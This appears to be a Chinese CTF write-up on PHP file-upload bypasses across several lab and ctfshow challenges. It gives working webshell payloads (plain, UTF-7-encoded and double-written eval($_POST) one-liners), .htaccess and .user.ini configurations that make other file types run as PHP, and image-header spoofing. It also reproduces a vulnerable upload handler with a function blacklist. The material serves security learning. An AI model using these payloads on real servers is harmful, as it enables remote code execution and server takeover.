<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>假设<code>&lt;?php</code> 被被过滤，同时PHP版本为5可以使用以上标签绕过。短标签默认开启。如靶机<code>upload2</code>就短标签<code>&lt;?</code>进行了过滤，那么可以使用<code>asp风格</code>标签进行绕过。</p>
<h3 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title="htaccess绕过"></a>htaccess绕过</h3><ul>
<li><p>当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。</p>
</li>
<li><p>.htaccess文件配置信息,这里将后缀为.aaa的文件均解析为php文件</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br></pre></td></tr></table></figure>

<ul>
<li><p>上传抓包上传.htaccess文件</p>
</li>
<li><p>上传1.aaa其内容为php文件即可</p>
</li>
<li><p><code>Cat /flag</code></p>
<h4 id="特殊编码绕过-UTF-7"><a href="#特殊编码绕过-UTF-7" class="headerlink" title="特殊编码绕过(UTF-7)"></a>特殊编码绕过(UTF-7)</h4><p>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候可以使用<code>htaccess</code>解码对应的文件，例如我们可以使用UTF-7进行解码：(<a href="http://toolswebtop.com/text/process/encode/utf-7%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%BC%96%E7%A0%81%E5%92%8C%E8%A7%A3%E7%A0%81UTF-7%EF%BC%89%E3%80%81">http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7）、</a></p>
<p>htaccess</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte <span class="number">1</span></span><br><span class="line">php_value zend.script_encoding <span class="string">&quot;UTF-7&quot;</span></span><br></pre></td></tr></table></figure>

<p>1.aaa</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php +AEA-<span class="keyword">eval</span>(+ACQAXw-POST+AFs<span class="string">&#x27;cmd&#x27;</span>+AF0)+ADs?+AD4-</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<h3 id="文件包含解码Base64"><a href="#文件包含解码Base64" class="headerlink" title="文件包含解码Base64"></a>文件包含解码Base64</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=shell.aaa&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h2><p>使用扫描器扫描发现存在备份文件</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232655.png" alt="微信截图_20200716232655"></p>
<p>下载备份文件</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232734.png" alt="微信截图_20200716232734"></p>
<ul>
<li>把<code>.index.php.swp</code>放到linux下使用vim -r恢复</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>

<ul>
<li><p>得到源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;../upload&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=strlen(<span class="variable">$s</span>)-<span class="number">1</span>;<span class="variable">$i</span>&gt;<span class="number">0</span>;<span class="variable">$i</span>--)&#123;</span><br><span class="line">                <span class="variable">$c</span>=substr(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span> == strlen(<span class="variable">$s</span>)-<span class="number">1</span> <span class="keyword">and</span> <span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> substr(<span class="variable">$s</span>,<span class="number">0</span>,<span class="variable">$i</span>+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span>=<span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span>=trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span>=deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span>=strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span>=strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span>=str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span>=trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(phpinfo|system\(|eval\(|file_put_contents|file_get_contents|passthru|exec\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;</span>,file_get_contents(<span class="variable">$temp_file</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不能含有危险函数！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span>=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$img_path</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请重新上传！&#x27;</span>;</span><br><span class="line">        mkdir(UPLOAD_PATH,<span class="number">775</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传文件</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716235614.png" alt="微信截图_20200716235614"></p>
</li>
</ul>
<p>成功执行代码</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716235728.png" alt="微信截图_20200716235728"></p>
<p>使用如下代码快速生成指定函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"> <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"> 	<span class="keyword">echo</span> <span class="string">&quot;chr(&quot;</span>.ord(<span class="variable">$a</span>[<span class="variable">$i</span>]).<span class="string">&quot;).&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title="user.ini绕过"></a>user.ini绕过</h3><ul>
<li>如果上传目录下有一个php文件，可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行</li>
<li>.user.ini</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>

<h3 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h3><h4 id="XMB文件头绕过"><a href="#XMB文件头绕过" class="headerlink" title="XMB文件头绕过"></a>XMB文件头绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br></pre></td></tr></table></figure>

<h4 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<h2 id="upload2"><a href="#upload2" class="headerlink" title="upload2"></a>upload2</h2><h3 id="文件后缀被绕过"><a href="#文件后缀被绕过" class="headerlink" title="文件后缀被绕过"></a>文件后缀被绕过</h3><p>简单上传，首先进行上传一个php文件，然后进行抓包，直接go</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDFDJCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>这里你会发现这个文件上传不了，所以进行尝试，看看是什么被限制，首先可以尝试一下文件后缀，将它改成txt或png，这时候</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDGDBCPGJGNGBGHGFCOHAGOGH" alt="image.png">出现了错误，所以要继续往下尝试，发现是短标签的绕过，所以要进行换一种标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">官方默认风格</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br><span class="line">短标签风格</span><br><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这里也有省略=号的写法<span class="meta">&lt;?php</span>info();<span class="meta">?&gt;</span></span></span><br><span class="line">   <span class="comment">/* 7版本支持，下面两个不支持*/</span></span><br><span class="line">ASP风格</span><br><span class="line">&lt;% phpinfo();%&gt;</span><br><span class="line">JS风格</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDGDHCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>这样之后要上传一个.htaccess的文件来解析.txt文件，直接在抓包那里新建就可以了，在本地也可以。</p>
<p>如.htaccess绕过</p>
<p>要是限制了php后缀，可以通过上传.htaccess去让别的后缀进行修改。</p>
<p>（对于题目是先上传后再用.htaccess去修改后缀）</p>
<p>遇到对文件名后缀限制时，用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。</p>
<p>例：.htaccess文件配置信息,这里将后缀为.txt的文件均解析为php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br></pre></td></tr></table></figure>



<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDHDBCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>之后可以在上传一句话木马，再蚁剑那里直接获得flag，或者用hackbar直接POST，也可以先查看一下是否上传成功</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>=phpinfo（）；</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=system（‘cat/flag’）；</span><br></pre></td></tr></table></figure>

<h1 id="upload7"><a href="#upload7" class="headerlink" title="upload7"></a>upload7</h1><h4 id="特色编码绕过"><a href="#特色编码绕过" class="headerlink" title="特色编码绕过"></a>特色编码绕过</h4><p>上传一下吧</p>
<p>本题和上一题一样，一开始的流程都是上传抓包，还是不是能上传php的文件</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDIDBCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>继续尝试，从上往下一步步寻找绕过问题，修改文件后缀后出现这个&lt;?,很明显被过滤了，此时需要更换标签了</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDIDDCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>很明显php版本超过7以上了，PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候可以使用<code>htaccess</code>解码对应的文件，例如我们可以使用UTF-7进行解码：</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDIDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>用特殊编码的时候在htaccess哪里改一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte <span class="number">1</span></span><br><span class="line">php_value zend.script_encoding <span class="string">&quot;UTF-7&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDJDFCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>然后1.txt的包可以修改成以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php</span><br><span class="line">system(<span class="string">&#x27;cat /flag&#x27;</span>)+ADs</span><br><span class="line">?+AD4-</span><br><span class="line">==<span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDIDJDHCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>这样直接访问得出php</p>
<p>也可以上传一句话木马，然后上蚁剑找flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">+ADw?php +AEA-（）(+ACQAXw-POST+AFs<span class="string">&#x27;cmd&#x27;</span>+AF0)+ADs?+AD4-</span><br><span class="line">==<span class="meta">&lt;?php</span> （）(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDADECPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>再得到flag之前也可以查看phpinfo看看是否已经上传成功。</p>
<h2 id="upload9"><a href="#upload9" class="headerlink" title="upload9"></a>upload9</h2><h4 id="图片头绕过-1"><a href="#图片头绕过-1" class="headerlink" title="图片头绕过"></a>图片头绕过</h4><p>本题的一开始也是和以上几题的方法一样，上传，抓包，尝试找问题，但本题一直显示不是图片类型，从这可以看出应该是考察图片头知识了</p>
<p>所以进行修改</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDBDJCPGJGNGBGHGFCOHAGOGH"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<p>很明显可以通过上传了，然后需要进行htaccess对php进行解析，依旧输入以下htaccess绕过，但本题目是图片头绕过，所以要进行</p>
<p>XMB文件头绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define test_width 16</span></span><br><span class="line"><span class="comment">#define test_height 7</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDCDACPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>然后查看是否有上传成功</p>
<p><img src="../../openfile.jsp" alt="image.png"></p>
<p>最后上传一句话木马到蚁剑里面进行查找flag</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDCDCCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<h2 id="upload4"><a href="#upload4" class="headerlink" title="upload4"></a>upload4</h2><h3 id="双写绕过-1"><a href="#双写绕过-1" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>前面的操作是一摸一样的，改后缀等</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDCDFCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>无论怎么弄都不能上传一句话木马，（如果上传成功，页面会跳转的，但是怎么都跳转不了页面）怀疑是里面的内容被绕过了，所以双写，把pphphp和eevalval这两个进行双写尝试，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>pphphp</span><br><span class="line">evevalal(<span class="variable">$_POpostST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>然后可以发现上传成功了，之后就可以进行蚁剑搜索了，然后就得到flag</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDCDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>注意这里的两个包要同时修改双写的内容，pphphp。</p>
<p>这里是htaccess的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;pic&quot;</span>; filename=<span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-pphphp .aaa</span><br></pre></td></tr></table></figure>

<h2 id="upload6"><a href="#upload6" class="headerlink" title="upload6"></a>upload6</h2><h4 id="htaccess文件换行绕过"><a href="#htaccess文件换行绕过" class="headerlink" title=".htaccess文件换行绕过"></a>.htaccess文件换行绕过</h4><p>本题前面操作一摸一样，抓包，修改，找问题</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDDDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>上传php文件不行，然后修改后缀，再进行htaccess的解析</p>
<p>出现了以下的问题：</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDDDCCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>application被限制了，不能进行输入，这时候采用就可以用换行绕过  ，加个\，就可以上传成功了（直接隔断好像也行）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">tion/x-httpd-php .aaa（txt）</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDDDDCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>之后可以上网页进行查询是否上传成功，可以查看其phpinfo，然后上传一句话木马<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDDDGCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>也可以用hackbar得到flag和查看目录</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDEDJDDDHCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<h2 id="ctfshow：web153-user-ini"><a href="#ctfshow：web153-user-ini" class="headerlink" title="ctfshow：web153  .user.ini"></a>ctfshow：web153  .user.ini</h2><p>当htaccess被过滤的时候，可以用这个，前提是要有一个php文件</p>
<p>.user.ini后缀（试了一下5版本不行，7版本可以）</p>
<p>本题目首先检查后缀名那里被限制了，然后将png修改成php或者直接删去，然后抓包进行修改，本题目发现出现一段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">\u6587\u4ef6\u7c7b\u578b\u4e0d\u5408\u89c4</span><br></pre></td></tr></table></figure>

<p>这样的代码，意思是文件类型不符合。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDBDIDECPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php2, php3, php4, php5, phps, pht, phtm, phtml</span><br><span class="line">经过测试全都不行。因此环境是nginx不是apache，所以.htaccess也不行。访问一下/upload/目录，发现页面存在，经过测试，/upload/index.php存在，因此想到上传.user.ini</span><br></pre></td></tr></table></figure>

<p>注意要修改以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=a.jpg（<span class="number">1</span>.txt）</span><br><span class="line">自动优先运行a.jpg文件</span><br></pre></td></tr></table></figure>

<p>//注释：注意还要将修改</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br></pre></td></tr></table></figure>

<p>然后上传另外一个包，上传一句话木马，然后进行检查，访问1.txt，还要访问upload/index.php,如果显示不在这，直接访问蚁剑就好了</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDBDIDDCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDBDIDCCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<h2 id="ctfshow：web152-后端文件类验证"><a href="#ctfshow：web152-后端文件类验证" class="headerlink" title="ctfshow：web152 后端文件类验证"></a>ctfshow：web152 后端文件类验证</h2><p>本题简简单单，直接首先一开始可以知道php不能上传，然后直接检查然后将png改为php，这时候可以抓包上传了，首先从文件名开始尝试，再从文件类型查找</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">image/png这一点很重要</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDBDIDICPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>发现可以上传了，然后直接上传一句话木马，就可以查flag</p>
<h2 id="ctfshow：web151-后端无验证"><a href="#ctfshow：web151-后端无验证" class="headerlink" title="ctfshow：web151 后端无验证"></a>ctfshow：web151 后端无验证</h2><p>本题直接检查将png改成php就可以上传抓包，直接上传，</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDBDIDJCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<h2 id="ctfshow-：web154-文件魔术字节欺骗"><a href="#ctfshow-：web154-文件魔术字节欺骗" class="headerlink" title="ctfshow ：web154 文件魔术字节欺骗"></a>ctfshow ：web154 文件魔术字节欺骗</h2><p>本题一开始的步骤和前面的一样的，但是呢，你尝试会发现，你首先改了文件后缀，他不可以上传，然后你改了文件类型发现也不可以上传通过</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDBDJDDCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>这是后你可以进去查看以下错误类型，你会发现显示了文件内容不合规，这时候我们可以通过修改文件内容进行尝试，发现是过滤了php，所以这时候我们可以把php换成其他内容</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDBDJDBCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p>这里涉及到了短标签的问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这里也有省略=号的写法<span class="meta">&lt;?php</span>info();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>再上传一个user.ini,再上传一句话木马就可以得到flag（但是不知道为什么访问1.txt直接显示内容）。</p>
<h2 id="ctfshow-web155"><a href="#ctfshow-web155" class="headerlink" title="ctfshow :web155"></a>ctfshow :web155</h2><p>本题和上一题的解题过程差不多，也是文件内容php被绕过，直接用短标签就可以绕过了</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDCDADDCPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<p><img src="../../image-20211125131017729.png" alt="image-20211125131017729"></p>
<p>要查找index.php再进行蚁剑查找（可能是user限制，而且直接访问会出现1.txt的内容，不知道是不是没解析成功，但是可以差flag的）</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDBDFDCDADECPGJGNGBGHGFCOHAGOGH" alt="image.png"></p>
<h2 id="ctfshow：web156"><a href="#ctfshow：web156" class="headerlink" title="ctfshow：web156"></a>ctfshow：web156</h2><p>经过测试，发现过滤了[和]，拿{}绕过即可。其余步骤和上面一样</p>
